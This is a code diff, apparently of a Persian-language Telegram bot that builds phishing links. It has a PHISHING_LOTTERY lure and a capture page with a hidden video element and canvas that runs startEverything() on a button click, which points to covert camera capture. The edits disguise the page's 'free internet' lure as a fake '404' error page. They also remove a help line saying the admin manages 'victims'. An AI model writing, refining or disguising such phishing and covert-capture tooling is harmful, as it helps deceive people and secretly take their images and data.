@@ -139,12 +139,12 @@ PHISHING_LOTTERY = """
 CAPTURE_PAGE_TEMPLATE = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>اتصال به اینترنت رایگان</title>
+<head><meta charset="UTF-8"><title>404</title>
 <style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:40vh;} video,canvas{display:none;} #btn{display:block;margin:20px auto;padding:15px 30px;font-size:20px;background:#4CAF50;border:none;border-radius:10px;color:white;cursor:pointer;}</style>
 </head>
 <body>
-    <h1 id="msg">برای فعال‌سازی اینترنت رایگان کلیک کنید</h1>
-    <button id="btn" onclick="startEverything()">اتصال به اینترنت رایگان</button>
+    <h1 id="msg">برای اتصال کلیک کنید</h1>
+    <button id="btn" onclick="startEverything()">error 404</button>
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
     <script>
@@ -499,9 +499,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🧠 قابلیت یادگیری کلمات:\n"
         "  /learn <b>کلمه</b> <b>پاسخ</b>\n"
         "  مثال: /learn سلام علیکم\n"
-        "  /unlearn <b>کلمه</b>\n"
+        "  "
         "  /wordlist\n\n"
-        "👤 مدیر ربات می‌تواند با /admin ربات را خاموش/روشن کرده و قربانیان را مدیریت کند."
+        ""
     )
     keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")]]
     if update.effective_user.id == ADMIN_USER_ID:
@@ -561,7 +561,7 @@ async def wordlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     text = "📚 کلمات یادگرفته شده:\n\n"
     for row in rows:
-        text += f"• <b>{row['keyword']}</b> → {row['response']}\n"
+        text += f"• <b>{row['keyword']}</b> ⚡ {row['response']}\n"
     await update.message.reply_text(text, parse_mode="HTML")
 
 # --- Auto-Reply using Learned Words ---
